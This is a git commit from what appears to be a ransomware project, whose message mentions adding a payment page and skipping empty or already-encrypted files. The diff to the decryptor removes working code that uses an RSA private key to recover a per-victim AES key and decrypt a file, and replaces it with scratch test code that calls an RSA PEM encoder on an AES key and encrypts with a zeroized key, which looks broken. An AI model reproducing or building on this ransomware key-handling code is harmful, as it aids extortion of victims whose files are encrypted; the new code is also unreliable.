31339fa731bb8e602685ed1b68526ea3d2716b3a
hitori1403 <hitori1403@gmail.com>
2024-05-26 20:28:39 +0700

    add payment page, don't encrypt empty file and file is already encrypted

--- decryptor/src/main.rs
+++ decryptor/src/main.rs
@@ -1,36 +1,23 @@
 use aes_gcm::{
-    aead::{Aead, Nonce},
-    Aes256Gcm, Key, KeyInit,
+    aead::{Aead, OsRng},
+    AeadCore, Aes256Gcm, Key, KeyInit,
 };
-use base64::{engine::general_purpose::STANDARD, Engine};
-use rsa::{pkcs1::DecodeRsaPrivateKey, Pkcs1v15Encrypt, RsaPrivateKey};
-use std::fs;
+use once_cell::sync::Lazy;
+use rsa::pkcs1::EncodeRsaPrivateKey;
+use zeroize::Zeroize;
+
+static mut AES_KEY: Lazy<Key<Aes256Gcm>> = Lazy::new(|| Aes256Gcm::generate_key(OsRng));
 
 fn main() {
-    let machine_info = String::from("ZEZieWkya2YwT2dtbWJMbpX1ZTE46th81aHOs/9qdBbswNnrI/VjdOWZ7yvSf777tSdQtr7vG53+iqhyLYJ0sd64PY8EXSO08WPbk8kCR8f9NW2oQXPsrwgzPTWVOAjyUv+GAfOWTn07Z1bWDDdyOhSnTknrFm/AhY8rprh7asDj8a/EUIBXDILFjDwGbQ8H/m45gP0FvY+cxAEk8cjtgvSLoTP2CQnS4Dg5uGvbZ3mvAEQhyre+eELCGFZXUX9p5fS1lxj72W2/L/Az9ruJoBtuiMfwAabcYELkxwirjWwIbrj8AHft7mfOcJ7gNQQiZLT67v7JFlMW3XM/cNoWsabgkDVtKkJnqzSLndsKWyE=");
-    let machine_info = STANDARD.decode(machine_info).unwrap();
+    unsafe {
+        AES_KEY.to_pkcs1_pem();
+        AES_KEY.zeroize();
 
-    let (machine_id, encrypted_aes_key) = machine_info.split_at(16);
-    let machine_id = String::from_utf8(machine_id.to_vec()).unwrap();
+        let nonce = Aes256Gcm::generate_nonce(OsRng);
 
-    println!("machine id: {}", machine_id);
+        let cipher = Aes256Gcm::new(&AES_KEY);
+        let ciphertext = cipher.encrypt(&nonce, "abcdef".as_ref()).unwrap();
 
-    let pem = fs::read_to_string("../server/priv.pem").unwrap();
-    let rsa_private_key = RsaPrivateKey::from_pkcs1_pem(&pem).unwrap();
-
-    let aes_key = rsa_private_key
-        .decrypt(Pkcs1v15Encrypt, encrypted_aes_key)
-        .unwrap();
-
-    let buf = fs::read("/tmp/hehe/a").unwrap();
-    let (nonce, encrypted_data) = buf.split_at(12);
-
-    let aes_key = Key::<Aes256Gcm>::from_slice(&aes_key);
-    let nonce = Nonce::<Aes256Gcm>::from_slice(nonce);
-
-    let cipher = Aes256Gcm::new(aes_key);
-
-    let plaintext = String::from_utf8(cipher.decrypt(nonce, encrypted_data).unwrap()).unwrap();
-
-    println!("decrypted data: {}", plaintext);
+        dbg!(ciphertext);
+    }
 }
